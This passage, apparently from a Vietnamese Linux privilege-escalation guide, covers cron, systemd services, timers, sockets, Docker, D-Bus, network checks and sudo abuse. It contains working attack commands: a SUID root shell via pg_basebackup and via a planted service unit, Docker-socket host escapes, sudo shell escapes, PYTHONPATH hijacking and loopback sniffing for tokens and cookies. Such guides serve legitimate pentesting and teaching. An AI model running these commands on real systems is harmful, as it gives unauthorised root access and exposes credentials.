Người dùng thông thường có thể vượt qua ranh giới đặc quyền nếu họ ghi được vào đúng binary mà cron job chạy bằng root sử dụng, nhưng cơ chế kiểm tra chữ ký tùy chỉnh có thể từ chối bản thay thế chưa ký. Trong trường hợp được ghi lại, ELF thuộc sở hữu của root có mode `0760`, cho phép thành viên trong group ghi vào nó, trong khi chủ sở hữu root có thể thực thi nó. Dấu vết tiến trình hiển thị cho thấy `objcopy` trích xuất `.text_sig` trước khi job chạy binary; không thể đọc toàn bộ script verifier.<sup>[[2]](#references)</sup>

Bản thay thế thành công được ký bằng signing material riêng tư bị leak, sử dụng một ELF signer. [Tài liệu về định dạng](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) mô tả một signature section được tạo từ `.text` của tệp thực thi. Chỉ thêm chứng chỉ hoặc chuỗi khớp vào `.text_sig` không được chứng minh là đủ để vượt qua verifier không hiển thị. Hãy kiểm tra đường dẫn thực tế được lên lịch chạy, quyền ghi hiệu lực, lệnh gọi bằng root và chính sách verifier trước khi kết luận rằng một binary có thể ghi và đã ký là có thể khai thác. Bản thân section `.text_sig` chỉ là một manh mối cần xem xét.

### Các cron job thường xuyên

Bạn có thể giám sát các tiến trình để tìm những tiến trình được thực thi mỗi 1, 2 hoặc 5 phút. Có thể tận dụng điều này để leo thang đặc quyền.

Ví dụ, để **giám sát mỗi 0.1s trong 1 phút**, **sắp xếp theo số lần thực thi tăng dần** và xóa các lệnh được thực thi nhiều nhất, bạn có thể chạy:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Bạn cũng có thể dùng** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (công cụ này sẽ giám sát và liệt kê mọi tiến trình được khởi chạy).

### Bản sao lưu của root giữ nguyên các bit mode do kẻ tấn công đặt (pg_basebackup)

Nếu một cron do root sở hữu chạy `pg_basebackup` (hoặc bất kỳ lệnh sao chép đệ quy nào) trên một thư mục cơ sở dữ liệu mà bạn có thể ghi, bạn có thể đặt một **tệp nhị phân SUID/SGID** để nó được sao chép lại dưới quyền **root:root**, với các bit mode giữ nguyên trong thư mục đầu ra của bản sao lưu.<sup>[[26]](#references)</sup>

Quy trình phát hiện thường dùng (với tư cách người dùng DB có ít quyền):
- Dùng `pspy` để phát hiện cron của root gọi lệnh như `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` mỗi phút.
- Xác nhận cụm nguồn (ví dụ: `/var/lib/postgresql/14/main`) cho phép bạn ghi và thư mục đích (`/opt/backups/current`) được sở hữu bởi root sau khi tác vụ chạy.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Điều này hoạt động vì `pg_basebackup` giữ nguyên các bit chế độ tệp khi sao chép cluster; khi được root gọi, các tệp đích sẽ có **quyền sở hữu root + SUID/SGID do attacker lựa chọn**. Bất kỳ quy trình sao lưu/sao chép đặc quyền tương tự nào giữ nguyên quyền và ghi vào một vị trí có thể thực thi đều dễ bị tấn công.

### Cron job ẩn

Có thể tạo một cronjob bằng cách **đặt ký tự carriage return sau một chú thích** (không có ký tự xuống dòng), và cron job vẫn sẽ hoạt động. Ví dụ (lưu ý ký tự carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Để phát hiện kiểu mục xâm nhập ẩn này, hãy kiểm tra các tệp cron bằng công cụ hiển thị ký tự điều khiển:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Dịch vụ

### Tệp _.service_ có thể ghi

Kiểm tra xem bạn có thể ghi vào tệp `.service` nào không. Nếu có, bạn **có thể sửa đổi tệp đó** để **chạy** **backdoor của bạn khi** service được **khởi động**, **khởi động lại** hoặc **dừng** (có thể bạn sẽ cần đợi máy được khởi động lại).\
Ví dụ: tạo backdoor bên trong tệp .service bằng **`ExecStart=/tmp/script.sh`**

### Binary của service có thể ghi

Hãy nhớ rằng nếu bạn có **quyền ghi đối với các binary được service thực thi**, bạn có thể thay chúng bằng backdoor để backdoor được chạy khi service được thực thi lại.

### PATH của systemd - Đường dẫn tương đối

Bạn có thể xem PATH được **systemd** sử dụng bằng lệnh:

```bash
systemctl show-environment
```

Nếu bạn phát hiện mình có thể **ghi** vào bất kỳ thư mục nào trong đường dẫn, bạn có thể **leo thang đặc quyền**. Bạn cần tìm kiếm các **đường dẫn tương đối được sử dụng trong các tệp cấu hình dịch vụ** như:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Sau đó, tạo một **tệp thực thi** có **cùng tên với binary theo đường dẫn tương đối** bên trong thư mục PATH của systemd mà bạn có quyền ghi. Khi service được yêu cầu thực hiện hành động dễ bị khai thác (**Start**, **Stop**, **Reload**), **backdoor của bạn sẽ được thực thi** (người dùng không có đặc quyền thường không thể khởi động/dừng service, nhưng hãy kiểm tra xem bạn có thể dùng `sudo -l` không).

**Tìm hiểu thêm về service với `man systemd.service`.**

## **Bộ hẹn giờ**

**Bộ hẹn giờ** là các tệp unit của systemd có tên kết thúc bằng `**.timer**`, dùng để điều khiển các tệp `**.service**` hoặc sự kiện. **Bộ hẹn giờ** có thể được dùng thay cho cron vì hỗ trợ tích hợp các sự kiện theo thời gian lịch và các sự kiện theo thời gian đơn điệu, đồng thời có thể chạy bất đồng bộ.

Bạn có thể liệt kê tất cả bộ hẹn giờ bằng:

```bash
systemctl list-timers --all
```

### Timer có thể ghi

Nếu bạn có thể sửa đổi một timer, bạn có thể khiến nó thực thi một số unit của systemd.unit (như `.service` hoặc `.target`).

```bash
Unit=backdoor.service
```

Trong tài liệu, bạn có thể đọc về Unit:

> Unit được kích hoạt khi timer này hết hạn. Đối số là tên của một unit, không có hậu tố “.timer”. Nếu không chỉ định, giá trị này mặc định là một service có cùng tên với timer unit, ngoại trừ hậu tố. (Xem bên trên.) Khuyến nghị đặt tên unit được kích hoạt và timer unit giống hệt nhau, ngoại trừ hậu tố.

Do đó, để lạm dụng quyền này, bạn cần:

- Tìm một systemd unit (như `.service`) đang **thực thi một binary có thể ghi**
- Tìm một systemd unit đang **thực thi một đường dẫn tương đối** và bạn có **quyền ghi** đối với **systemd PATH** (để giả mạo executable đó)

**Tìm hiểu thêm về timer bằng `man systemd.timer`.**

### **Bật Timer**

Để bật timer, bạn cần quyền root và thực thi:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Lưu ý **timer** được **kích hoạt** bằng cách tạo symlink đến nó tại `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) cho phép **các tiến trình giao tiếp** trên cùng hoặc khác máy trong mô hình client-server. Chúng sử dụng các tệp descriptor Unix tiêu chuẩn để giao tiếp giữa các máy tính và được thiết lập thông qua các tệp `.socket`.<sup>[[14]](#references)</sup>

Có thể cấu hình socket bằng các tệp `.socket`.

**Tìm hiểu thêm về socket bằng `man systemd.socket`.** Trong tệp này, có thể cấu hình một số tham số đáng chú ý:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Các tùy chọn này khác nhau, nhưng có thể tóm tắt là dùng để **chỉ định nơi socket sẽ lắng nghe** (đường dẫn của tệp socket AF_UNIX, IPv4/6 và/hoặc số cổng cần lắng nghe, v.v.)
- `Accept`: Nhận một đối số boolean. Nếu **true**, một **service instance được khởi chạy cho mỗi kết nối đến** và chỉ socket kết nối được chuyển cho nó. Nếu **false**, tất cả socket đang lắng nghe **được chuyển cho service unit được khởi chạy**, và chỉ một service unit được khởi chạy để xử lý mọi kết nối. Giá trị này bị bỏ qua với datagram socket và FIFO, nơi một service unit duy nhất luôn xử lý toàn bộ lưu lượng đến. **Mặc định là false**. Vì lý do hiệu năng, nên chỉ viết daemon mới theo cách tương thích với `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Nhận một hoặc nhiều dòng lệnh, được **thực thi trước** hoặc **sau khi các socket**/FIFO đang lắng nghe được **tạo** và liên kết tương ứng. Token đầu tiên của dòng lệnh phải là tên tệp tuyệt đối, theo sau là các đối số cho tiến trình.
- `ExecStopPre`, `ExecStopPost`: Các **lệnh** bổ sung được **thực thi trước** hoặc **sau khi các socket**/FIFO đang lắng nghe được **đóng** và gỡ bỏ tương ứng.
- `Service`: Chỉ định tên service unit **cần kích hoạt** khi có **lưu lượng đến**. Chỉ được phép dùng thiết lập này với socket có Accept=no. Mặc định là service có cùng tên với socket (thay hậu tố). Trong hầu hết trường hợp, không cần dùng tùy chọn này.

### Tệp .socket có quyền ghi

Nếu tìm thấy tệp `.socket` **có quyền ghi**, bạn có thể **thêm** vào đầu phần `[Socket]` nội dung như sau: `ExecStartPre=/home/kali/sys/backdoor` và backdoor sẽ được thực thi trước khi socket được tạo. Do đó, bạn sẽ **có thể phải đợi đến khi máy khởi động lại.**\
_Lưu ý rằng hệ thống phải đang sử dụng cấu hình tệp socket đó, nếu không backdoor sẽ không được thực thi_

### Kích hoạt socket + đường dẫn unit có quyền ghi (tạo service còn thiếu)

Một cấu hình sai khác có tác động lớn là:

- một socket unit có `Accept=no` và `Service=<name>.service`
- service unit được tham chiếu không tồn tại
- attacker có thể ghi vào `/etc/systemd/system` (hoặc một đường dẫn unit khác trong danh sách tìm kiếm)

Trong trường hợp đó, attacker có thể tạo `<name>.service`, rồi gửi lưu lượng đến socket để systemd tải và thực thi service mới với quyền root.

Luồng thực hiện nhanh:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Socket có thể ghi

Nếu bạn **phát hiện bất kỳ socket nào có thể ghi** (_ở đây chúng ta đang nói về Unix Sockets, không phải các tệp cấu hình `.socket`_), thì **bạn có thể giao tiếp** với socket đó và có thể khai thác một lỗ hổng.

### Liệt kê Unix Sockets

```bash
netstat -a -p --unix
```

### Kết nối thô

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Ví dụ khai thác:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Lưu ý rằng có thể có một số **socket đang lắng nghe các yêu cầu HTTP** (_tôi không nói về các tệp .socket mà là những tệp hoạt động như unix socket_). Bạn có thể kiểm tra điều này bằng:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Nếu socket **phản hồi bằng một yêu cầu HTTP**, bạn có thể **giao tiếp** với nó và có thể **khai thác một lỗ hổng**.

### Socket Docker có thể ghi

Socket Docker, thường nằm tại `/var/run/docker.sock`, là một tệp quan trọng cần được bảo vệ. Theo mặc định, người dùng `root` và các thành viên trong nhóm `docker` có quyền ghi vào socket này. Có quyền ghi vào socket có thể dẫn đến leo thang đặc quyền. Dưới đây là giải thích cách thực hiện và các phương pháp thay thế nếu không có Docker CLI.

#### **Leo thang đặc quyền bằng Docker CLI**

Nếu bạn có quyền ghi vào socket Docker, bạn có thể leo thang đặc quyền bằng các lệnh sau:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Các lệnh này cho phép bạn chạy một container với quyền root trên hệ thống tệp của host.

#### **Sử dụng trực tiếp Docker API**

Trong trường hợp không có Docker CLI, bạn vẫn có thể khai thác Docker socket bằng HTTP thô qua Unix socket. Quy trình đáng tin cậy nhất là:

- tạo một container hỗ trợ chạy lâu dài và bind-mount thư mục root của host
- khởi động container đó
- tạo một phiên bản `exec` bên trong container hỗ trợ
- khởi động phiên bản `exec` và đọc kết quả thông qua API

**Liệt kê các Docker image**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Tạo và khởi chạy một container hỗ trợ**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Tạo một exec instance**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Khởi chạy instance exec và đọc output**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Mẫu này thường đáng tin cậy hơn so với việc cố điều khiển `attach` thủ công bằng `socat` hoặc `nc -U`. Khi có thể tạo một helper bằng `/:/host`, bạn có thể dùng các instance `exec` bổ sung để đọc những tệp như `/host/root/...`, thêm SSH key vào `/host/root/.ssh` hoặc chỉnh sửa các tệp khởi động của host.

### Khác

Lưu ý rằng nếu bạn có quyền ghi vào docker socket vì **bạn đang ở trong group `docker`**, thì bạn có [**nhiều cách hơn để leo thang đặc quyền**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Nếu [**docker API đang lắng nghe trên một port**, bạn cũng có thể compromise nó](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Xem **thêm các cách thoát khỏi container hoặc lạm dụng container runtime để leo thang đặc quyền** tại:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Leo thang đặc quyền Containerd (ctr)

Nếu phát hiện có thể sử dụng lệnh **`ctr`**, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Leo thang đặc quyền **RunC**

Nếu phát hiện có thể sử dụng lệnh **`runc`**, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus là một **hệ thống giao tiếp liên tiến trình (IPC)** tinh vi, cho phép các ứng dụng tương tác và chia sẻ dữ liệu hiệu quả. Được thiết kế dành cho hệ thống Linux hiện đại, D-Bus cung cấp một framework mạnh mẽ hỗ trợ nhiều hình thức giao tiếp giữa các ứng dụng.<sup>[[16]](#references)</sup>

Hệ thống này rất linh hoạt, hỗ trợ IPC cơ bản để tăng cường trao đổi dữ liệu giữa các tiến trình, tương tự như **UNIX domain socket được cải tiến**. Ngoài ra, D-Bus còn hỗ trợ phát các sự kiện hoặc tín hiệu, giúp các thành phần hệ thống tích hợp liền mạch. Ví dụ, tín hiệu từ daemon Bluetooth báo có cuộc gọi đến có thể khiến trình phát nhạc tắt tiếng, cải thiện trải nghiệm người dùng. D-Bus cũng hỗ trợ hệ thống đối tượng từ xa, đơn giản hóa việc yêu cầu dịch vụ và gọi phương thức giữa các ứng dụng, giúp tinh giản những quy trình vốn phức tạp.

D-Bus hoạt động theo **mô hình cho phép/từ chối**, quản lý quyền của thông điệp (lời gọi phương thức, phát tín hiệu, v.v.) dựa trên tác động tổng hợp của các quy tắc chính sách phù hợp. Những chính sách này quy định các tương tác với bus và có thể tạo cơ hội leo thang đặc quyền thông qua việc khai thác các quyền đó.

Ví dụ về một chính sách như vậy trong `/etc/dbus-1/system.d/wpa_supplicant.conf` được cung cấp bên dưới, nêu chi tiết quyền của người dùng root trong việc sở hữu, gửi và nhận thông điệp từ `fi.w1.wpa_supplicant1`.

Các chính sách không chỉ định người dùng hoặc group sẽ áp dụng cho tất cả, trong khi các chính sách theo ngữ cảnh "default" áp dụng cho mọi trường hợp không được các chính sách cụ thể khác bao phủ.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Tìm hiểu cách enumerate và exploit giao tiếp D-Bus tại đây:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mạng**

Luôn thú vị khi enumerate mạng và xác định vị trí của máy.

### Enumerate chung

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Nếu một mục `/etc/inetd.conf` đang hoạt động chạy GNU Inetutils `telnetd` với quyền root, hãy kiểm tra phiên bản binary được cấu hình và listener cục bộ, kể cả khi cổng chỉ bind vào loopback. GNU Inetutils từ phiên bản 1.9.3 đến 2.7 có [lỗ hổng bỏ qua xác thực Telnet](https://seclists.org/oss-sec/2026/q1/89), trong đó `USER` do client cung cấp được chuyển tới `login -f` (CVE-2026-24061). Một process hoặc chuỗi phiên bản chỉ là dấu hiệu; hãy xác nhận trạng thái bản vá của vendor và daemon thực tế trước khi kết luận dịch vụ bị lộ. [Hướng dẫn Telnet](../../../network-services-pentesting/pentesting-telnet.md) có thêm chi tiết.

### Phân loại nhanh bộ lọc lưu lượng đi ra

Nếu host có thể chạy lệnh nhưng callback thất bại, hãy nhanh chóng phân biệt bộ lọc DNS, transport, proxy và route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Cổng đang mở

Luôn kiểm tra các dịch vụ mạng đang chạy trên máy mà bạn chưa thể tương tác trước khi truy cập vào máy đó:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Phân loại các listener theo địa chỉ bind:

- `0.0.0.0` / `[::]`: được mở trên tất cả giao diện mạng cục bộ.
- `127.0.0.1` / `::1`: chỉ cục bộ (phù hợp để tunnel/forward).
- Các IP nội bộ cụ thể (ví dụ: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): thường chỉ có thể truy cập từ các phân đoạn mạng nội bộ.

### Quy trình kiểm tra nhanh service chỉ cục bộ

Khi chiếm được một host, các service bind với `127.0.0.1` thường lần đầu tiên có thể truy cập được từ shell của bạn. Quy trình nhanh tại máy cục bộ như sau:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS như một trình quét mạng (chế độ chỉ quét mạng)

Ngoài các kiểm tra PE cục bộ, linPEAS có thể chạy như một trình quét mạng chuyên dụng. Công cụ sử dụng các binary có sẵn trong `$PATH` (thường là `fping`, `ping`, `nc`, `ncat`) và không cài đặt công cụ nào.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Nếu bạn dùng `-d`, `-p` hoặc `-i` mà không có `-t`, linPEAS sẽ hoạt động như một network scanner thuần túy (bỏ qua các bước kiểm tra privilege-escalation còn lại).

### Sniffing

Kiểm tra xem bạn có thể sniff traffic hay không. Nếu có, bạn có thể lấy được một số credentials.

```
timeout 1 tcpdump
```

Một số kiểm tra thực tế nhanh:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) đặc biệt hữu ích trong post-exploitation vì nhiều dịch vụ chỉ dùng nội bộ để lộ tokens/cookies/credentials tại đó:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Thu thập ngay, phân tích sau:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Người dùng

### Liệt kê chung

Kiểm tra bạn là **ai**, bạn có những **quyền** nào, hệ thống có những **người dùng** nào, người dùng nào có thể **login** và người dùng nào có **quyền root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Big UID

Một số phiên bản Linux bị ảnh hưởng bởi lỗi cho phép người dùng có **UID > INT_MAX** leo thang đặc quyền. Thông tin thêm: [tại đây](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tại đây](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) và [tại đây](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Khai thác lỗi này** bằng: **`systemd-run -t /bin/bash`**

### Nhóm

Kiểm tra xem bạn có phải là **thành viên của nhóm nào đó** có thể cấp cho bạn quyền root hay không:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Kiểm tra xem clipboard có chứa thông tin gì đáng chú ý không (nếu có thể)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Chính sách mật khẩu

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Mật khẩu đã biết

Nếu bạn **biết bất kỳ mật khẩu nào** trong môi trường, **hãy thử đăng nhập bằng mật khẩu đó với từng user**.

### Su Brute

Nếu bạn không ngại tạo nhiều tiếng ồn và máy tính có các binary `su` và `timeout`, bạn có thể thử brute-force user bằng [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) với tham số `-a` cũng thử brute-force user.

## Lạm dụng PATH có quyền ghi

### $PATH

Nếu bạn phát hiện mình có thể **ghi vào một thư mục nào đó trong $PATH**, bạn có thể leo thang đặc quyền bằng cách **tạo backdoor trong thư mục có quyền ghi** với tên của một lệnh sẽ được user khác (tốt nhất là root) thực thi và lệnh đó **không được nạp từ một thư mục nằm trước thư mục có quyền ghi của bạn trong $PATH**.

### SUDO và SUID

Bạn có thể được phép thực thi một số lệnh bằng sudo, hoặc chúng có thể có bit suid. Kiểm tra bằng:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Một số **lệnh không ngờ tới cho phép bạn đọc và/hoặc ghi tệp, thậm chí thực thi lệnh**.<sup>[[8]](#references)</sup> Ví dụ:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Cấu hình Sudo có thể cho phép người dùng thực thi một số lệnh với quyền của người dùng khác mà không cần biết mật khẩu.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Trong ví dụ này, người dùng `demo` có thể chạy `vim` với quyền `root`; giờ đây, việc mở shell rất dễ dàng bằng cách thêm một ssh key vào thư mục root hoặc gọi `sh`.

```
sudo vim -c '!sh'
```

### So sánh Bash không đặt trong dấu ngoặc kép trong script sudo

Trong Bash, vế phải của `[[ "$protected" == $candidate ]]` là một mẫu. Nếu một script sudo có khả năng chạy với quyền root lấy giá trị `candidate` từ một tệp do người gọi kiểm soát, thì giá trị như `prefix*` có thể khớp với phần đầu của một chuỗi được bảo vệ. Các nhánh thành công và lỗi khác nhau khi đó có thể làm lộ thông tin qua một prefix oracle. Hãy đặt vế phải trong dấu ngoặc kép (`[[ "$protected" == "$candidate" ]]`) khi cần so sánh chính xác. Trước khi kết luận rằng phép so sánh không đặt trong dấu ngoặc kép có thể bị khai thác, hãy kiểm tra các đối số sudo thực tế, nguồn gốc đầu vào và hành vi của các nhánh có thể quan sát được. [Sổ tay GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) mô tả hành vi của mẫu này.

### Tệp dự án PrusaSlicer chạy bằng sudo

Cần xem xét kỹ một quyền sudo không hạn chế cho `prusaslicer` hoặc `prusa-slicer` có khả năng chạy với quyền root nếu người gọi có thể chọn dự án `.3mf` được xử lý. Một dự án có thể chứa script hậu xử lý, được chạy khi xuất G-code; các dự án được tạo đặc biệt có thể thực thi lệnh trong PrusaSlicer phiên bản 2.6.1 trở xuống ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Trước khi kết luận rằng có thể vượt qua ranh giới đặc quyền, hãy xác minh quy tắc sudo có hiệu lực, phiên bản binary và các bản vá của nhà cung cấp, nguồn của dự án, cũng như liệu luồng xuất liên quan có được chạy hay không. Một đối số dự án cố định hoặc chính sách `NOEXEC` có hiệu lực có thể làm thay đổi kết quả. Chỉ phát hiện slicer đã được cài đặt không đủ để xác lập một đường dẫn leo thang đặc quyền.

### SETENV

Chỉ thị này cho phép người dùng **đặt một biến môi trường** khi thực thi một lệnh:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ví dụ này, **dựa trên máy Admirer của HTB**, **có lỗ hổng** cho phép **PYTHONPATH hijacking** để tải một thư viện Python bất kỳ khi thực thi tập lệnh với quyền root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Đầu độc `__pycache__` / `.pyc` có thể ghi trong các import Python được phép chạy bằng sudo

